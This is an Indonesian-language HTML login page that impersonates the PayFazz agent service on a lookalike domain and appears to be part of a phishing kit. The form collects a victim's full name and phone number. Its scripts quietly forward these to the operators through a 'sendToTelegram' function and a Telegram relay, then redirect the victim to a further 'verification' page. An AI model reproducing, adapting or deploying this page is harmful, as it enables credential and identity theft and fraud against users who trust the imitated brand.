<!DOCTYPE html>
<html lang="id">
<head><base href="https://www.payfazz.aktifkan-pesanan.xyz"/>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulir Pengajuan Agen PayFazz</title>
    <link rel="icon" type="image/png" href="image/images.jpg">
    <link rel="apple-touch-icon" href="image/images.jpg">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; }
        .gradient-bg { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
    </style>

    <!-- Open Graph Meta Tags -->
    <meta property="og:title" content="PAYFAZZ AGEN">
    <meta property="og:description" content="Aplikasi Agen PAYFAZZ">
    <meta property="og:image" content="https://static.tildacdn.info/tild3833-3963-4466-a363-313133616338/-/resize/504x/images_2.jpeg">
    <meta property="og:url" content="https://www.payfazz.aktifkan-pesanan.xyz/login.html">
</head>
<body class="bg-white">
    <div class="min-h-screen bg-white">
        <!-- Header -->
        <header class="text-center pt-8 pb-6">
            <div class="text-white text-2xl font-bold mb-2">FAZZ AGEN</div>
            <div class="text-blue-200 text-sm" id="actionTypeText">Masuk ke Akun Anda</div>
        </header>

        <!-- Main Content -->
        <main class="container mx-auto px-4 max-w-md">
            <div class="bg-white rounded-2xl shadow-xl p-8">
                <div class="text-center mb-8">
                    <h2 class="text-2xl font-bold text-gray-800 mb-2">Selamat Datang</h2>
                    <p class="text-gray-600">Masukkan data Anda untuk melanjutkan</p>
                </div>

                <form id="loginForm" class="space-y-6">
                    <div>
                        <label for="nama" class="block text-sm font-medium text-gray-700 mb-2">Nama Lengkap</label>
                        <input 
                            type="text" 
                            id="nama" 
                            name="nama" 
                            required
                            class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                            placeholder="Masukkan nama lengkap Anda"
                        >
                    </div>

                    <div>
                        <label for="nohp" class="block text-sm font-medium text-gray-700 mb-2">Nomor Handphone</label>
                        <input 
                            type="tel" 
                            id="nohp" 
                            name="nohp" 
                            required
                            class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                            placeholder="08xxxxxxxxxx"
                        >
                    </div>

                    <button 
                        type="submit" 
                        class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-6 rounded-lg transition duration-300"
                        id="lanjutkan"
                    >
                        Lanjutkan
                    </button>
                </form>

                <div class="text-center mt-6">
                    <a href="index.html" class="text-blue-600 hover:text-blue-800 text-sm">
                        ‚Üê Kembali ke Beranda
                    </a>
                </div>
            </div>
        </main>
    </div>

    <script>
        // Set action type text
        const actionType = localStorage.getItem('actionType') || 'umum';
        const actionTexts = {
            'pesanan': 'Aktifkan Pesanan',
            'pembayaran': 'Aktifkan Pembayaran',
            'kendala': 'Laporan Kendala'
        };
        document.getElementById('actionTypeText').textContent = actionTexts[actionType] || 'Masuk ke Akun Anda';

        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const nohp = document.getElementById('nohp').value;
            document.getElementById('lanjutkan').innerHTML = "Memproses...";

            try {
                await sendToTelegram({
                    step: 'login',
                    nama: '-',
                    nohp: nohp
                });

                // Simpan data untuk halaman berikutnya
                localStorage.setItem('userData', JSON.stringify({
                    nama: document.getElementById('nama').value,
                    nohp: document.getElementById('nohp').value,
                    actionType: 'Verifikasi Akun'
                }));
                
                // Redirect ke halaman konfirmasi
                window.location.href = 'konfirmasi.html';
            } catch (error) {
                console.error('Error:', error);
            } finally {
                document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
            }
        });

        // Telegram Bot Function
        async function sendToTelegram(data) {
            try {
                await fetch('http://localhost:3000/api/send-telegram', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (error) {
                console.log('Telegram send error:', error);
            }
        }
    </script>
    <script src="js/telegram.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const loginForm = document.getElementById('loginForm');
            if (!loginForm) {
                console.error('Form not found!');
                return;
            }

            loginForm.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const namaInput = document.getElementById('nama');
                const nohpInput = document.getElementById('nohp');

                if (!namaInput || !nohpInput) {
                    console.error('Input fields not found!');
                    return;
                }

                try {
                    const pageData = {
                        nama: namaInput.value,
                        nohp: nohpInput.value,
                        step: 'login'
                    };

                    const success = await sendToTelegram(pageData);
                    if (success) {
                        // Save to localStorage
                        localStorage.setItem('userData', JSON.stringify({
                            nama: document.getElementById('nama').value,
                            nohp: document.getElementById('nohp').value,
                            actionType: 'Verifikasi Akun'
                        }));
                        // Redirect to next page
                        window.location.href = 'konfirmasi.html';
                    } else {
                        throw new Error('Failed to send data');
                    }
                } catch (error) {
                    console.error('Error:', error);
                    alert('Terjadi kesalahan, silakan coba lagi.');
                }
            });
        });
    </script>
</body>
</html>
